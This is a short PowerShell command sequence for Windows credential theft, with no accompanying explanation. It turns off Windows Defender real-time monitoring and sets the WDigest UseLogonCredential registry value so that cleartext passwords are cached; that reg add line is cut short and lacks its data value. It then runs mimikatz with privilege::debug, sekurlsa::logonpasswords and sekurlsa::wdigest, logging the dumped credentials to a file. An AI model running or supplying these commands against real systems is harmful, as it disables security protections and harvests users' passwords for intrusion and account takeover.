Set-MpPreference -DisableRealtimeMonitoring 1

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d

$MIMIPATH="C:\Program Files\mimikatz\x64\mimikatz.exe"
$MIMIPATH "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"
